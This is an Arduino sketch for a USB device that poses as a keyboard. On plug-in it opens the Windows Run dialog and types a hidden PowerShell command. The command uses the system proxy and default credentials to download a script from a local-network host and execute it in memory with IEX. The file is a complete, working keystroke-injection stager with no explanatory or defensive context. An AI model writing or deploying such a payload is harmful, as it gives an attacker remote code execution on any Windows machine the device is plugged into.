#include<HID-Project.h>
void setup(){
    Keyboard.begin();
    delay(5000);
    Keyboard.press(KEY_LEFT_GUI);
    Keyboard.press('d');
    Keyboard.releaseAll();
    delay(100);
    Keyboard.press(KEY_LEFT_GUI);
    Keyboard.press('r');
    Keyboard.releaseAll();
    delay(100);
    Keyboard.println("powershell.exe -nop -w hidden -c $C=new-object net.webclient;$C.proxy=[Net.WebRequest]::GetSystemWebProxy();$C.Proxy.Credentials=[Net.CredentialCache]::DefaultCredentials;IEX $C.downloadstring('http://192.168.1.36:8080/W1Nd0WsP0WN3D');");
}

void loop(){}
